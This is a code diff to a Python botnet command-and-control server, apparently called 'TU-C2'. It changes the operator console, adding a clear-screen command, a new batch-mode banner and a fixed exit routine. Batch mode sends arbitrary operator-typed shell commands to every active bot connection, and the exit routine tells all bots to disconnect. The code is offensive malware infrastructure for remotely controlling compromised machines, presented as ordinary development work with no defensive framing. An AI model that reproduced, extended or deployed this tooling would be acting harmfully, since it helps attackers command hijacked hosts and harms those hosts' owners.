@@ -12,6 +12,7 @@ q = queue.Queue()
 allConnections = []         # Stores all BotHandler instances
 activeConnections = []      # Stores all currently active BotHandler sessions
 deadConnections = []        # Records the dead-instance's information
+
 clientAddressList = {}      # Stores client_address[] info (IP, Port): IP is stored in string format, port is not
 
 # -------------------------------------------------------------------------------------------
@@ -108,6 +109,8 @@ class Interpreter(threading.Thread):
                 pass
             elif (cmd.casefold() == "exit"):
                 self.exit()
+            elif (cmd.casefold() == "clear"):
+                self.clearScreen()
             elif (cmd.casefold() == "list-active"):
                 self.listActive()
             elif (cmd.casefold() == "list-all"):
@@ -126,11 +129,25 @@ class Interpreter(threading.Thread):
                 #     conn.execute(cmd)
 #------------------------------------------------------------------------------------------------------------------------------
     def batchMode(self):
-        print("[* Interpreter-Msg] Entering Batch-Mode execution... Enter 'quit' at any point to exit batch-mode...")
+
+        self.clearScreen()
+        print("[* Interpreter-Msg] Entering Batch-Mode execution: ")
+        print("[* Interpreter-Msg] The commands entered here will be sent to all connections marked as ACTIVE")
+        print("[* Interpreter-Msg] Note: This mode will not allow for individual shell environments")
+        print
+        print("[* Interpreter-Msg] Enter Q or QUIT at any time to exit this mode")
+        print
+        print
+
+
         batch_cmd = ""
 
         while (batch_cmd.casefold() != "quit" and batch_cmd.casefold() != "q"):
-            batch_cmd = str(input("[Batch-CMD]# "))
+            batch_cmd = str(input("[TU-C2:BATCH-CMD]# "))
+            
+            if batch_cmd.casefold() == "exit":
+                self.exit()
+            
             print(f"[+] Sending Command: {batch_cmd} to {str(len(allConnections))} bots")
             for conn in activeConnections:                                         
                 time.sleep(0.1)
@@ -172,10 +189,10 @@ class Interpreter(threading.Thread):
                     activeConnections.remove(conn)
 #------------------------------------------------------------------------------------------------------------------------------
     def exit(self):
-        print(f"[* Interpreter-Msg] Sending Command: {cmd} to {str(len(allConnections))} bots")
+        print(f"[* Interpreter-Msg] Closing connection to {str(len(allConnections))} bots")
         for conn in allConnections:                                         # for i in range(len(allConnections)):
             time.sleep(0.1)
-            conn.execute(cmd)
+            conn.execute("exit")
 
         print("[* Interpreter-Msg] Exiting connection[s] for all bots Please wait...")
         time.sleep(5)
